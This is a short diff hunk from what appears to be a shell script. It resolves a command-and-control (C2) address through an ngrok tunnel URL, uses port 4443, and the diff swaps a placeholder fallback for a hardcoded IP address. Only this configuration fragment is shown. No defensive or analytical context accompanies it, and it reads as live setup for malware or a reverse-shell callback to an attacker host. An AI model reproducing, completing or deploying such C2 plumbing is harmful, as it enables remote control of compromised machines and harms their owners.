@@ -2,7 +2,7 @@
 
 
 NGROK_URL="https://directly-hippopotamic-berniece.ngrok-free.dev"  
-C2_IP=$(curl -s "$NGROK_URL/ip" 2>/dev/null || echo "YOUR_FALLBACK_IP")
+C2_IP=$(curl -s "$NGROK_URL/ip" 2>/dev/null || echo "117.238.105.201")
 C2_PORT="4443"
 
 
